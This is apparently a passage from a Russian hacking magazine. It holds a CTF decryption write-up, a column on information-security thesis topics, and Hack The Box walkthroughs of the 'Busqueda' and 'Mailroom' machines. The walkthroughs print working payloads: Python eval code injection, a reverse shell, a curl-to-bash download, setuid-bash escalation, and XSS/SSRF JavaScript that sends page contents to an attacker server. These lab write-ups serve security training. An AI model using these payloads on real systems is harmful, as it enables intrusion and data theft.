  Ниже приведена получившаяся прог рамма. Для исполнения рекомендую
использовать .NET 8.0 и выше.


using System;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;


namespace Decryptor
{
  public class Program
  {
     static void Main(string[] args)
     {
         var cmd = File.ReadAllBytes("C:\\Users\\Antony\\Desktop\\
C2Interstellar_HTB\\C2_Interstellar_CTF_Task\\WShark 2\\
%3fdVfhJmc2ciKvPOC(23).png");
         string key = "nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=";
         var text = Program.Decryption(key, cmd).Replace("\0", string
.Empty);
     }



     static byte[] Decompress(byte[] data)
     {
         using (var compressedStream = new MemoryStream(data))
         using (var zipStream = new GZipStream(compressedStream,
CompressionMode.Decompress))
         using (var resultStream = new MemoryStream())
         {
             zipStream.CopyTo(resultStream);
             return resultStream.ToArray();
         }
     }


     private static string Decryption(string key, byte[] arr)
     {
         byte[] tmp_arr = arr[1500..arr.Length];


         byte[] array2 = new byte[16];


         Array.Copy(tmp_arr, array2, 16);
         string text = "";
         try
         {
             SymmetricAlgorithm symmetricAlgorithm = Program.
CreateCam(key, Convert.ToBase64String(array2), true);
             byte[] array3 = symmetricAlgorithm.CreateDecryptor().
TransformFinalBlock(tmp_arr, 16, tmp_arr.Length - 16);
             byte[] arr4 = Decompress(array3);
             byte[] tet = Convert.FromBase64String(Encoding.ASCII.
GetString(arr4));
             File.WriteAllBytes("C:\\Users\\Antony\\Desktop\\
C2Interstellar_HTB\\C2_Interstellar_CTF_Task\\WShark 2\\DecodedInfo\\
decrypted_image4.png", tet);
         }
         catch
         {
             SymmetricAlgorithm symmetricAlgorithm2 = Program.
CreateCam(key, Convert.ToBase64String(array2), false);
             byte[] array4 = symmetricAlgorithm2.CreateDecryptor().
TransformFinalBlock(tmp_arr, 16, tmp_arr.Length - 16);
             text = Encoding.UTF8.GetString(Convert.FromBase64String(
Encoding.UTF8.GetString(array4).Trim(new char[1])));
         }
         finally
         {
             Array.Clear(tmp_arr, 0, tmp_arr.Length);
             Array.Clear(array2, 0, 16);
         }
         return text;
     }


     private static SymmetricAlgorithm CreateCam(string key, string
IV, bool rij = true)
     {
         SymmetricAlgorithm symmetricAlgorithm;
         if (rij)
         {
             symmetricAlgorithm = new RijndaelManaged();
         }
         else
         {
             symmetricAlgorithm = new AesCryptoServiceProvider();
         }
         symmetricAlgorithm.Mode = CipherMode.CBC;
         symmetricAlgorithm.Padding = PaddingMode.Zeros;
         symmetricAlgorithm.BlockSize = 128;
         symmetricAlgorithm.KeySize = 256;
         if (IV != null)
         {
             symmetricAlgorithm.IV = Convert.FromBase64String(IV);
         }
         else
         {
             symmetricAlgorithm.GenerateIV();
         }
         if (key != null)
         {
             symmetricAlgorithm.Key = Convert.FromBase64String(key);
         }
         return symmetricAlgorithm;
     }
  }

За кро потливую работу нас ждет награда в виде флага, который был ответом
на это интерес ное задание.





                             Флаг


ÂÛÂÎÄÛ

Итак, мы провели небольшое рассле дование и выяс нили, как злоумышленник
доставил на ском про метированный хост дополнительные утилиты, выпол нил
вре донос ный код и эксфильтровал дан ные со ском прометирован ного узла.
ВЗЛОМ





     КОЛОНКА ДЕНИСА МАКРУШИНА





Начало учебного года — это еще и начало
сезона под готов ки дипломных работ. А это
значит, что у меня наступа ет сезон фор-
                                                                         Денис Макрушинмулиро вания тем для  студентов факуль-
                                                                                       Специализируется
                                                                                      на исследовании угрозтетов и кафедр информационной безопас-
                                                                                 и разработке технологий
                                                                               защиты от целевых атак.ности в ведущих  вузах. Я собрал свои
                                                                                         @makrushin
рекомендации и лайфхаки для под готовки
тво его пер вого ИБ-иссле дова ния.




Де нис Макрушин — выпускник факультета информационной безопас ности
НИЯУ МИФИ и там же продолжает делить ся опытом со студентами сво ей аль-
ма-матер. Также Денис выс тупа ет научным руководителем для сту дентов раз-
ных ведущих кафедр и факультетов стра ны в области информационной
безопасности и защиты информации.


Я сформулировал рекомендации по принципу «один абзац — один инсайт»
и распре делил  их по разделам.  Какие-то инсай ты  могут пригодиться
для учеб но-иссле дователь ской работы, какие-то — для под готовки первого
доклада на кон ференцию.


ÑÒÀÂÈÌ ÖÅËÈ

Нач нем с основного: хард скиллы в индустрии необ ходимы, но софтскиллы —
это основа практически любой про фессии, которая подразумевает общение
с людьми. Поэтому относись к дип лому не как к фор мальности, а как к средс-
тву, которое прокачивает и хард скиллы (результаты исследования — ути литы,
метрики, код), и софтскиллы (пред став ление этих результатов — отчеты, пре-
зентации).
  Эксперты не появляют ся на пустом месте и рас тут не в результате бес-
сонных ночей, про веденных за тех ническими исследованиями, а в результате
признания сооб щес твом этих бессонных ночей. Вот почему коммуникация
и отчетность — это необходимые этапы любого иссле дования. И любого про-
екта. Да, и твоего дип ломного проекта тоже.
   Есть возможность получить быстрый отклик на свое исследование: пост
в бло ге и пре зентация на конференции. Сна чала пост. Его текст позволит
под готовить  сценарий  для  выступления.  Если  сму щает  выс тупление
перед боль шой аудитори ей, соз дай вебинар для своих друзей. Пусть
это будет репети цией тво его доклада перед большим мероприятием. Нап-
ример, перед защитой диплома.




Напом ним, что ты всегда можешь прислать свою статью в «Хакер». Авторам
опубликованных матери алов вып лачивается гонорар, к тому же мы помога ем
с редак турой и офор млением статьи. По вопросам сотрудничества пиши
глав ному редак тору, адрес — на странице контактов.



Выступле ние на любом релевантном мероприятии — это хороший способ
получить обратную связь, завести новых знакомых и, возможно, найти пар-
тнеров по исследовательской работе. В роли обычного участни ка ты рис-
куешь потратить драгоценное вре мя в углу комнаты с чаш кой кофе и ноут-
буком, а статус спикера обязыва ет выйти под свет софитов.
  Пример из моего опы та: поез дка на реги ональ ный BSides в Каире. Итоги
доклада:
 1. Èìïàêò: знакомс тво с экспертами EG-CERT и передача отче тов с уяз-
   вимостями и лан дшафтом угроз для реги она.
 2. Íåòâîðêèíã: зарядил энергией студентов местных факультетов Computer
   Science, теперь они хотят про должить обу чение в направле нии ИБ.
 3. Íåòâîðêèíã: поступил запрос о мен торстве от талантливого сту дента
   из Mansoura University для его под готовки к докладу на конференции в сле-
  дующем году (поз же рас скажу, что из это го получилось).
 4. Èí òåãðàöèÿ â ñîîá ùåñòâî: поступило приг лашение в состав Review
   Board мероприятия.

Ес ли ты посещаешь конференции в онлайне ради контента, рекомендую
пересмотреть отношение к мероп риятиям. Личное присутствие всегда при-
дает им допол нительную ценность.


ÂÛÁÈÐÀÅÌ ÒÅÌÓ

С при чинами и мотива ми разоб рались. Теперь нужно определиться с темой
будущей работы. Давай для примера возь мем статистику рас простра нения
троянов-шиф роваль щиков. Вот что нам известно об этом:
 1. Хроноло гия развития это го типа малвари демонстрирует взрывной рост:
   от пары семей ств в 2010-м до 20+ семейств ежемесячно к 2017-му.
 2. Число  атак шифровальщиков  удвоилось  в 2021  году  в  срав нении
   с 2020 годом.
 3. Ско рость  разворачивания шифровальщика  в  скомпрометированной
   инфраструктуре увеличивает ся, что значительно снижает вре мя, нужное
   для реагирования на инцидент (в 2021 году у жертвы было 92 часа, чтобы
   спасти свои данные).
 4. Среднее время простоя инфраструк туры и бизнес-процессов в результате
   атак вы росло с 15 часов в 2020 году до 22 часов в 2021-м (время — день-
    ги!).
 5. Ущерб от атак шифровальщиков в 2021 году оце нивался в 20 миллиардов
   дол ларов, а к 2031 году ожи дается ущерб в 265 миллиар дов.

На осно ве этих дан ных получа ем рецепт хорошей темы для кур совой:
 1. Находим зло дея: берем наиболее острую проблему, которая мешает жить
   всем индустри ям, пользователям.
 2. Препари руем зло дея: изучаем тех ничес кие особенности, выделя ем клю-
   чевые харак теристики, ищем слабое мес то.
 3. Соз даем антидот и не забыва ем рас сказать об этом в тек сте работы.

Вкратце: определи проб лему, изу чи существу ющие решения, выяви их общий
недос таток и предложи свой вариант его исправления.
  Плохая идея: попросить ChatGPT придумать для тебя тему. Хорошая идея:
попросить его же собрать матери алы для уже выб ранной темы. В чем раз-
ница? В пер вом случае ты позволяешь алго рит му определить судьбу твоей
работы. Во втором случае ты эко номишь свое время на сбор и анализ акту-
аль ных знаний по направлению, которое задал сам.





  Ответ ChatGPT на предложение придумать тему пер спективного иссле-
  дования в нап равлении кибер безопас ности

Ес ли все рав но придется тра тить время на подготов ку дипломной работы, то
почему бы не инвести ровать это время в интерес ный тебе проект? Даже если
ты учишься по нелюбимому направлению и готовишься стать специалистом
в неинтересной тебе области (ну или за дипломом тебя просто отпра вили
родите ли), то даже в этом случае можешь син тезировать дипломную тему
на основе тре бований факультета (или кафед ры) и области твоих инте ресов.
  Нап ример, ты учишь ся на специалис та по информационной безопасности,
но чувствуешь, что мог бы стать композито ром. Набросай облако тегов:
«защита»,  «музыка»,  «интеллектуальная  собс твенность»,  «утеч ки  ком-
позиций»,  «пиратство»,  «кибербезопасность  в  музыкаль ной  индустрии»
и тому подобное.
   Вот тут за идеями быва ет полезно обра титься к генеративным алгорит-
мам.





  Пример того, как алгоритмы могут быть источни ком идей для объеди -
  нения несколь ких областей в одно исследователь ское направление


ÔÎÐÌÓËÈÐÓÅÌ ÒÅÌÓ

Об ласть иссле дований определена. Теперь прис тупаем к формулировке
темы.
   Есть минимум два способа сформулировать тему пер спек тивно го иссле-
дования. Мож но про вес ти так называемый анализ state of the art — изучить
все доступные опуб ликованные работы в нуж ном нап равле нии. Основные
требования для этих работ: они должны быть акту альными (период актуаль-
ности опре деляешь сам) и релевантными твоему направле нию. В процессе
ана лиза выписывай источники, даты пуб ликации и авторов — все это при-
годится.
   Когда  будешь  изучать  источни ки,  возьми  на  воору жение  сайты
ResearchGate и Google Scholar.
  Там ты можешь най ти работы, которые еще не опуб ликованы в цитируемых
научных изда ниях, но которые могут содер жать какие-то полезные для тебя
артефакты: чер новики, аннотации к док ладам, пос ты в блогах и тому подоб-
ное.
  Нес мотря  на  то  что  все  исследова тельское  сооб щес тво  говорит
на англий ском языке, про анализируй российские и китай ские базы зна ний.
С этой задачей тоже неплохо помога ет ChatGPT.





  ChatGPT подсказывает дополнительные источники исследовательских
  работ в России и Китае

При чтении ста тей обращай внимание на раздел «Зак лючение», в котором
содержатся выводы и предложены варианты продолжения работы. В этом
раз деле могут быть описаны огра ничения предложенных автором методов,
алго ритмов и систем. А для тебя эти огра ниче ния могут стать отправной точ-
кой в фор мулиро вании темы тво его про екта.
  Самый инте ресный под ход к задаче — это спросить эксперта, который
погружен в эту область и который пуб ликовал результаты своих проектов.
Пом нишь, что, помимо списка источников, я рекомендовал делать список
авто ров? Вот теперь пройдись по нему и определи наиболее активного
или интересного тебе. Затем выходи с ним на связь любым удобным обра-
зом, что бы обсудить тему сво ей работы.
  Прев ратить автора интересного тебе про екта в своего научного руково-
дителя или ментора — это та самая задача, которая может зна чительно улуч-
шить твою работу.
  Да и вообще выбор научного руководителя — это минимум треть успеха
будущей работы. Поэтому если по каким-то причинам ты не можешь его най-
ти на сво ем факультете или в уни верситете, то ищи в индус трии.


ÏÐÎÂÎÄÈÌ ÈÑÑËÅÄÎÂÀÍÈß

Оп ределил тему, сформулировал цель работы. Теперь надо делать.
   Раздели под готовку работы на эта пы:
 1. Содержание (ключевые разделы работы).
 2. Презентация (каждый заголовок слай да — раз дел работы).
 3. К каждому слай ду сделай ком мента рий, в котором будут основные тезисы.
 4. Абс тракт работы.
 5. Аннотация или авто реферат.
 6. Отчет.

Именно в этой последовательности ты начинаешь движение от общего к час-
тному.
  Незави симо от типа исследова ния его результатом должно стать íî âîå
çíàíèå. Если ито гом работы не будет что-то новое, то автор просто попол-
няет свалку известных мыслей. Оставь это алго ритмам.
  Даже если задача тво его проекта не заключается в разработ ке нового
метода или системы, а пред ставляет собой обзор существу ющих работ, то
даже в этом случае можно синтезировать новое знание. Для этого можно
использовать сле дующие методы анализа и син теза новых знаний.





            Методы анализа и синтеза новых знаний

State of the art (SOTA) — метод обзора больших объемов литературы, который
позволя ет изучить, почему и как развивались наши текущие знания, и пред-
ложить новые направле ния исследований. Метод хорошо опи сан в статье
«State-of-the-art literature review methodology: A six-step approach for knowledge
synthesis».
  Обзор, проведенный методом SOTA, дает ответы на три вопроса:
 1. Где мы находимся сейчас?
 2. Как мы сюда попали?
 3. Куда мож но двигаться дальше?

Review/Survey — метод обзора литера туры, который, в отличие от SOTA,
охватывает более широкий  хроноло гичес кий срез и включает  в себя
как результаты анализа SOTA, так и историчес кое развитие объекта иссле-
дования. Другими словами, SOTA — это часть Review.
  Приступай к содержанию. Наб росок оглавления — это уже значительная
часть работы. Веро ятно, у тебя получится что-то вро де этого:
 1. Вве дение
 2. Опи сание проблемы
 3. Обзор сущес тву ющих подходов к ее решению
    • 3.1. Критерии сравнения подходов
    • 3.2. Срав нение существу ющих подходов по выб ранным критериям
    • 3.3. Опре деле ние наиболее удач ного подхода на осно ве сравнения.
    Описание его клю чевых огра ничений
 4. Твои варианты улучшения выб ранно го подхода
 5. Заключение

Ес ли у тебя уже есть идеи, то прис тупай к раз делу 4. Чем быстрее ты поймешь
состоятельность своего подхода, метода и системы иссле дования, тем быс-
трее сформулируешь ценность работы. Затем смо жешь оценить уникаль-
ность предложенной тобой идеи при под готов ке раздела 3. И не начинай
писать текст работы с введения. Лирику оставишь на заключительный этап.
   Как толь ко в работе появи лись результаты, доказывающие сос тоятель-
ность твоей идеи, уже мож но готовить анно тацию (abstract). Это короткое (от
одного до трех абзацев текста) описание работы, дающее полное представ-
ление о цели и результатах твоего проекта.
  Ре зультаты иссле дования получены. Абстракт подготовлен. Теперь тебе
нуж но выбрать конференцию или митап и адап тировать аннотацию иссле-
дования в соответствии с требованиями выб ранного мероприятия. Изу чи
информацию о тре бованиях организа торов к подаче заявок, обычно они пуб-
ликуются на отдельной странице.
   Как выб рать конференцию, чтобы и тема тво ей работы подходила, и бюд-
жет на путешествие был доступен? Можно начать с изучения ресурса
cfptime.org.
  В первую оче редь под держи свое локальное сообщество. Иногда мес-
тные мероприятия могут быть интерес нее и теплее, чем международные
и гло баль ные тусовки. Об этом я уже рас ска зывал в другом выпус ке колонки.
  Вы бирай местную конференцию. Участвуй, собирай отзы вы, затем совер-
шенс твуй свое исследова ние и подавай заяв ку на участие в мероприятии
поболь ше. Исследуй, выступай, обновляй, пов торяй.
   Как подготовить хорошую заявку на доклад? Лучше узнать у опытных чле-
нов комиссии, которая рассматривает заяв ки. К примеру, организаторы кон-
ферен ции Security Analysts Summit посвятили целый тред подготовке качес-
твен ного абстракта.
  Почему участники дол жны посетить именно твой доклад? Запиши ответ.
Най ди  опытного  чле на комиссии,  который может  дать ценный  совет
по поводу твоего доклада или хотя бы тек ста заявки.
  И напос ледок: опре дели стратегичес кую цель сво его иссле дования. При-
мер плохой пос тановки цели: «получение и совершенствование навыков экс-
плуата ции XSS». Хорошая цель: «обнаружить результаты воз действия XSS
в системах, которые ранее не подверга лись XSS-атакам». То есть во втором
слу чае — синтез старой проб лемы с новым кон текстом.
   Если твое иссле дование выяви ло проб лему, помни об ответственности.
Опиши решение, дай рекомендации, помоги всем заинтересо ванным сто-
ронам. Ты делаешь про ект не для того, что бы еще раз показать, что этот мир
несовер шенен.
  «Преж де все го — не нав реди».
ВЗЛОМ





         ЭКСПЛУАТИРУЕМ БАГ
      В ПРИЛОЖЕНИИ НА PYTHON,
     ЧТОБЫ ЗАХВАТИТЬ ВЕБ-СЕРВЕР





Начав про хож дение этой машины с базово-
го аудита сервиса, мы найдем уязвимость
в нем, получим доступ к сер веру и обна-
ружим на нем критически важные данные.
Для повыше ния привилегий получим дос туп             RalfHacker                                                                                             hackerralf8@gmail.com
к внут ренне му Gitea и найдем возможность
внедрения команд в про ект.


Наша цель — зах ват рута на тренировочной машине Busqueda с площадки
Hack The Box. Уро вень сложности — легкий.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.208    busqueda.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел все го два откры тых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб-сервер Apache 2.4.52.

В отчете Nmap видим, что в заголовке http-title прописан редирект
на домен searcher.htb, который тоже сразу добавляем в /etc/hosts.


10.10.11.208    busqueda.htb searcher.htb

Те перь можем перейти к самому сай ту searcher.htb.


ÒÎ×ÊÀ ÂÕÎÄÀ
На сайте находим пометку Powered by, которая указывает, что мы име ем дело
с чем-то под названи ем Searchor 2.4.0.





                        Главная стра ница сай та

Находим исходни ки этой прог раммы на GitHub, откры ваем историю изме-
нений и видим, что в вер сии 2.4.2 была запатчена некая уяз вимость.





                   История версий на GitHub

Наша задача — узнать, что именно было изменено и мож но ли использовать
баг для атаки.


ÒÎ×ÊÀ ÎÏÎÐÛ
Открываем ком мит, в котором была исправлена уязвимость, и изучаем изме-
нения.





                  Исходный код — файл main.py

Видим, что поль зовательский ввод вставляется в шаб лон и переда ется в фун-
кцию eval. Эта функция выполняет переданный ей в строке код на Python.
Попробуем проэксплуати ровать уяз вимость внедрения кода с помощью наг-
рузок из  статьи Майкла Элкана. Не забываем  закодировать  нагрузку
в кодировку URL (в Burp Suite достаточ но нажать Ctrl-U).


' eval(compile('for x in range( 1) :\n import os\n os.system("id")','',
'single')) '





                   Выпол нение коман ды id

Ко ман да id успешно  сработала. Давай  теперь  закинем реверс-шелл
на Python 3.


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.99",4321));os.dup2(
s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
pty; pty.spawn("sh")'

Нап рямую выполнить эту команду не выш ло, поэто му исполь зуем обходной
путь. Сох раним наш шелл в файл и в той же папке запус тим веб-сервер
коман дой python3 -m http.server 80. Теперь на удаленном сервере ска-
чиваем наш файл с помощью curl и передаем его содер жимое на выпол-
нение в командную оболочку Bash. Предваритель но запускаем листенер
pwncat-cs. И таким образом получаем дос туп к системе и флаг пользовате-
ля.


'%2beval(compile('for+x+in+range( 1) %3a\n+import+os\n+os.system(
"curl+http%3a//10.10.14.99/rs|bash")','','single'))%2b'





                       Флаг пользователя


ÏÐÎÄÂÈÆÅÍÈÅ
Те перь нам необходимо собрать информацию. Я буду использовать для это-
го скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Заг рузим на хост скрипт для Linux. Для это го в pwncat-cs используем ком-
бинацию клавиш Ctrl-D (выход в главное меню) и команду upload для заг-
рузки файла. Затем возвращаемся в шелл командой back, даем право
на выпол нение нашему скрипту (chmod +x linpeas.sh) и запускаем ска-
нирование. В выводе будет очень мно го информации, поэто му отберем толь-
ко значимую.
  В фай ле /etc/hosts отмечаем запись gitea.searcher.htb.





                  Имена хостов и DNS-име на

Сре ди прос лушиваемых портов находим порт для службы MySQL (порт 3306)
и Gitea (3000).





                     Прос лушиваемые порты

Настройки sudoers дос тупны только при вводе пароля.



                   Вывод коман ды sudo -l

А в домашнем катало ге пользователя находим типичный для Gitea файл с нас-
тройками ~/.git/config, который часто содер жит учетные данные.





          Файлы в корневых катало гах дру гих пользовате лей

Смотрим конфиг /var/www/app/.git/config и находим учетные данные,
которые под ходят для пользователя svc.





            Содер жимое фай ла /var/www/app/.git/cong




                    Сессия пользователя svc


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Авторизо вав шись от име ни svc, перейдем к нас трой кам sudoers, которые
в дан ном слу чае можно получить, только вве дя пароль пользователя.


sudo -l





                       Настройки sudoers




Файл /etc/sudoers в Linux содержит спис ки команд, которые разные группы
поль зовате лей могут выполнять от имени администратора системы. Можно
прос мотреть его как напрямую, так и при помощи команды sudo -l.



Как видишь, мы можем выполнить коман ду /usr/bin/python3  /opt/
scripts/system-checkup.py  * от имени пользовате ля root. Получить
содержимое этого скрипта не выйдет, так как чте ние доступно только
для суперполь зовате ля, а всем остальным раз решено только выполнение
скрип та.




                  Права фай ла system-checkup.py

По лучить исходник скрипта не удалось, так что давай попробуем поработать
с ним самим. Вдруг команда help выдаст нам что-то полезное?


sudo /usr/bin/python3 /opt/scripts/system-checkup.py *





             Ме ню help скрип та system-checkup.py

Итак, нам доступны известные команды Docker: ps и inspect. Попробуем
получить спи сок запущенных контейнеров.


sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps



                  Запущенные контейнеры Docker

Видим два контейнера: gitea и mysql_db. Получим их кон фиги, указав
параметр docker-inspect.


sudo python3 /opt/scripts/system-checkup.py docker-inspect --format=
'{{json .Config}}' gitea


sudo python3 /opt/scripts/system-checkup.py docker-inspect --format=
'{{json .Config}}' mysql_db





             Кон фигурации запущенных докер-кон тей неров

В настройках докер-контей нера mysql_db находим пароли для MySQL и сер-
виса Gitea. Давай получим доступ Gitea. Для это го сначала добавим запись
в файл /etc/hosts.


127.0.0.1 gitea.searcher.htb

Те перь нужно будет проб росить порт 3000 на свой хост с помощью SSH.


ssh svc@busqueda.htb -L 3000:127.0.0.1:3000

Те перь весь тра фик, который мы отпра вим на локаль ный порт 3000, будет
туннелирован на порт 3000 ука занного хоста (в данном случае 127.0.0.1)
через SSH-хост.





                        Главная стра ница Gitea

Те перь мы можем авторизовать ся с найденным паролем от име ни поль-
зователя administrator и  получить дос туп  к  зак рытому репози торию
scripts.





                    Дос тупные репози тории

В репози тории обнаружи ваем уже знакомый нам скрипт, к коду которого мы
раньше не смогли получить доступ.





                   Файлы в про екте scripts

Анализируя исходный код, обращаем вни мание на тре тий, не использован-
ный нами ранее параметр — full-checkup.





                     Исходный код скрипта

С ключом full-checkup скрипт выполнит файл full-checkup.sh в текущем
катало ге. А это путь к выполнению произволь ного кода. Мы можем перейти
в каталог с правом на запись, к при меру /dev/shm, и создать в нем скрипт
full-checkup.sh, который наз начит S-бит фай лу командной оболочки /bin/
bash.


#!/bin/bash
chmod +s /bin/bash

Затем выпол ним команду, которая запустит наш скрипт.


/opt/scripts/system-checkup.py full-checkup





                     Экс плуата ция уяз вимости




Когда у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до пользователя — вла-
дельца файла в рам ках запущенного процес са. Пос ле получения повышенных
прав при ложе ние может выполнять задачи, которые недоступны обычному
поль зовате лю. Из-за воз можнос ти сос тояния гонки многие операци онные
системы игнориру ют S-атрибут, уста новленный shell-скриптам.



/bin/bash -p





                           Флаг рута

У нас есть дос туп от имени рута, а значит, машина захвачена!
ВЗЛОМ





       ЭКСПЛУАТИРУЕМ NOSQL-
      ИНЪЕКЦИЮ ЧЕРЕЗ ЦЕПОЧКУ
      УЯЗВИМОСТЕЙ XSS И SSRF





В этом райтапе я покажу сразу нес колько
видов атак на веб-приложения: мы проэкс-
плуатируем XSS и SSRF, затем проведем
инъ екцию NoSQL, а получив доступ к скры-
тому сайту, найдем уязвимость внед рения             RalfHacker                                                                                             hackerralf8@gmail.com
команд и обойдем фильтр, что бы получить
RCE. Закончим трей син гом пользователь-
ского про цесса в Linux для перехвата вво-
димого в KeePass пароля.


Уп ражняться в этом нам поможет трениро вочная машина сложного уровня
Mailroom с площадки Hack The Box.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.209    mailroom.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел все го два откры тых порта: 22 — служ ба OpenSSH 8.2p1 и 80 —
веб-сервер Apache 2.4.54. Начина ем, как всег да, с веб-сервера.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ
XSS
На сай те есть форма связи с администра тором. Проверяем, нет ли тут уяз-
вимос ти XSS, и в ответ при ходит ссылка на стра ницу с сооб щением.





               Форма связи с админис тра тором





                  Результат отправки сообщения

Пе реходим по этой ссылке и получаем отправ ленный нами alert.





                    Результат выполнения кода

Так мы под твер дили наличие XSS, теперь нужно расширить область тес-
тирования. Для этого перей дем к ска нированию каталогов и других под-
доменов.


Ñêàíèðîâàíèå âåá-êîíòåíòà
Сканиро вание каталогов ничего не дало, поэтому переходим к сканированию
под доменов. Новые сайты откро ют новую область для тестирования, а следс-
твен но, и больше потенциальных точек вхо да.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю лег кий и очень быс трый ﬀuf. При запус ке указываем сле-
дующие парамет ры:
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — заголовок HTTP.

Место перебора помеча ется сло вом FUZZ.


Запускаем перебор:


ffuf -u http://mailroom.htb -w subdomains-top1million-110000.txt -t
256 -H 'Host: FUZZ.mailroom.htb'





          Ре зультат ска нирования поддоменов с помощью ﬀuf

Но в вывод попадают все вари анты из сло варя, поэтому установим фильтр
(параметр  -fs),  который  убирает  из  вывода  все  страницы  с  раз-
мером 7748 байт.


ffuf -u http://mailroom.htb/ -w subdomains-top1million-110000.txt -t
256 -H 'Host: FUZZ.mailroom.htb' -fs 7748





          Ре зультат ска нирования поддоменов с помощью ﬀuf

Так находим еще один сайт git.mailroom.htb. Давай обно вим запись в фай-
ле /etc/hosts и прос мотрим сайт.


10.10.11.209 mailroom.htb git.mailroom.htb





                        Главная стра ница сай та

Нас встре чает платформа Gitea, аналог GitHub для уста новки на свой сервер.


Gitea
Пос мотрим, какие есть репозитории и пользователи.





                  Дос тупные репозитории Gitea





                  Доступные пользователи Gitea

Нам дос тупен все го один проект — staffroom. Файлы из него тоже нужно
про анализи ровать.





                 Со держимое про екта staﬀroom

При ложе ние написано на PHP и, возможно, хостится на той же машине.
Поэтому вниматель но смотрим исходники и выбираем блоки кода для более
под робно го анализа. Естествен но, заодно ищем учетные данные и новые
адреса.
   Так файл auth.php раскрывает нам новый поддомен.





                    Исходный код auth.php

А в фай ле inspect.php вызывается опас ная фун кция shell_exec, в которую
передаются заранее отфильтро ванные пользователь ские данные.





                   Исходный код inspect.php

Добав ляем най денное доменное имя в файл /etc/hosts и смотрим новый
сайт.


10.10.11.209 mailroom.htb git.mailroom.htb staff-review-panel.
mailroom.htb





                       Баннер веб-сервера

Этот сайт закрыт от посторонних глаз, поэто му поп робу ем получить доступ
к нему немного другим путем.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




          ЭКСПЛУАТИРУЕМ NOSQL-ИНЪЕКЦИЮ ЧЕРЕЗ
                ЦЕПОЧКУ УЯЗВИМОСТЕЙ XSS И SSRF





ÒÎ×ÊÀ ÎÏÎÐÛ
XSS
Мы уже наш ли уязвимость XSS, теперь нуж но ее раскру тить. Выложим на свой
веб-сервер файл, который будет содержать код JavaScript, в качестве тес та
выполняющий запрос на наш сервер.


fetch("http://10.10.14.119/xss_test");

А в отправ ляемой нагрузке будем указывать этот файл как источник кода бло-
ка script.


<script src="http://10.10.14.119/expl.js"></script>





               Форма связи с админис тра тором





                      Ло ги веб-сервера

И в логах веб-сервера видим обра щение — сначала к фай лу с наг рузкой,
а потом как под тверждение выполненного кода на JavaScript.


XSS + SSRF
Те перь попробуем эксфильтро вать  главную  стра ницу  закрытого сайта.
Для этого в исполняемом коде на JavaScript будем запрашивать удаленный
сайт, а ответ сер вера будем кодировать в Base64 и передавать в качестве
парамет ра при вто ром зап росе на свой сервер.


var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://staff-review-panel.mailroom.htb/index.php',
true);
xhr.setRequestHeader('Content-type', 'application/
x-www-form-urlencoded');
xhr.onreadystatechange = function() {
   if (xhr.readyState == XMLHttpRequest.DONE) {
       fetch("http://10.10.14.119/?" + encodeURI(btoa(this.
responseText)));
   }
};
xhr.send(null);





                      Ло ги веб-сервера

